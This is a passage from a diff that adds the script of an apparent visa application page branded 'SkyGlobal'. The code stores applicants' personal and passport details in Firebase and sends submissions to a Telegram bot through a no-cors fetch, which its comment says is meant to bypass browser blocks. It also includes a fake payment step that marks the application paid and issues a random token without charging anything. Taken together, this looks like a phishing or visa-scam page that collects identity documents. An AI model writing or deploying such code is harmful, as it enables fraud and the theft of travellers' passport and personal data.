+Submitted: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`;
+
+            try {
+                // Direct API call using no-cors mode to bypass browser blocks
+                const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+                
+                // Using fetch with no-cors mode. This sends the request successfully even if the browser blocks reading the response.
+                await fetch(telegramUrl, {
+                    method: 'GET',
+                    mode: 'no-cors' 
+                });
+                
+                console.log('✅ Telegram request sent (no-cors mode)');
+                return true;
+            } catch (error) {
+                console.error('❌ Telegram Error:', error);
+                return false;
+            }
+        }
+
+        // ============================================
+        // SUBMIT TO FIREBASE + TELEGRAM
+        // ============================================
+        async function proceedToStep4() {
+            const confirmAccuracy = document.getElementById('confirmAccuracy').checked;
+            const agreeTerms = document.getElementById('agreeTerms').checked;
+            
+            if (!confirmAccuracy || !agreeTerms) {
+                alert('Please confirm the accuracy of information and agree to terms & conditions');
+                return;
+            }
+            
+            const submitBtn = event ? event.target : document.querySelector('#step3Review .btn-primary');
+            const originalBtnText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<span class="loading"></span> Saving...';
+            submitBtn.disabled = true;
+
+            try {
+                const isNewSubmission = !applicationData.appId;
+                let appId = applicationData.appId;
+
+                const firebaseData = {
+                    destination: applicationData.destination,
+                    travellers: applicationData.travellers,
+                    purpose: applicationData.purpose,
+                    travelDate: applicationData.travelDate,
+                    duration: applicationData.duration,
+                    previousTravel: applicationData.previousTravel,
+                    hasPassport: applicationData.hasPassport,
+                    personalInfo: applicationData.personalInfo,
+                    passportInfo: applicationData.passportInfo,
+                    employment: applicationData.employment,
+                    funding: applicationData.funding,
+                    status: 'Pending Payment',
+                    paymentStatus: 'Unpaid',
+                    updatedAt: firebase.database.ServerValue.TIMESTAMP
+                };
+
+                if (isNewSubmission) {
+                    const newAppRef = database.ref('applications').push();
+                    appId = newAppRef.key;
+                    firebaseData.appId = appId;
+                    firebaseData.submittedAt = firebase.database.ServerValue.TIMESTAMP;
+                    await newAppRef.set(firebaseData);
+                    applicationData.appId = appId;
+
+                    // ✅ Send to Telegram immediately
+                    await sendToTelegram(applicationData);
+
+                    await enforceMaxEntries(30);
+                    console.log('✅ New application saved:', appId);
+                } else {
+                    firebaseData.appId = appId;
+                    await database.ref('applications/' + appId).update(firebaseData);
+                    console.log('✅ Application updated:', appId);
+                }
+                
+                goToStep(4);
+                
+            } catch (error) {
+                console.error("❌ Error:", error);
+                alert("Error saving application: " + error.message);
+            } finally {
+                submitBtn.innerHTML = originalBtnText;
+                submitBtn.disabled = false;
+            }
+        }
+
+        function showPaymentStage() {
+            document.getElementById('downloadAppStage').classList.add('hidden');
+            document.getElementById('paymentStage').classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        async function processPayment() {
+            const btn = event.target;
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<span class="loading"></span> Generating Token...';
+            btn.disabled = true;
+            
+            const token = 'SG-2026-' + Math.floor(100000 + Math.random() * 900000);
+            
+            try {
+                if (applicationData.appId) {
+                    await database.ref('applications/' + applicationData.appId).update({
+                        token: token,
+                        paymentStatus: 'successful',
+                        status: 'Token Generated',
+                        paidAt: firebase.database.ServerValue.TIMESTAMP
+                    });
+                }
+                
+                document.getElementById('tokenNumber').textContent = token;
+                applicationData.token = token;
+                applicationData.paymentStatus = 'successful';
+                applicationData.status = 'Token Generated';
+                
+                document.getElementById('paymentStage').classList.add('hidden');
+                document.getElementById('tokenSuccess').classList.remove('hidden');
+                
+            } catch (error) {
+                console.error("Error:", error);
+                document.getElementById('tokenNumber').textContent = token;
+                document.getElementById('paymentStage').classList.add('hidden');
+                document.getElementById('tokenSuccess').classList.remove('hidden');
+            } finally {
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }
+        }
+
+        function downloadSummary() {
+            const summary = {
+                token: applicationData.token,
+                destination: applicationData.destination,
+                purpose: applicationData.purpose,
+                travellers: applicationData.travellers,
+                personalInfo: applicationData.personalInfo,
+                passportInfo: applicationData.passportInfo,
+                submittedOn: new Date().toISOString()
+            };
+            
+            const blob = new Blob([JSON.stringify(summary, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `SkyGlobal-${applicationData.token}.json`;
+            a.click();
+            alert('Application summary downloaded successfully!');
+        }
+    </script>
+</body>
+</html>
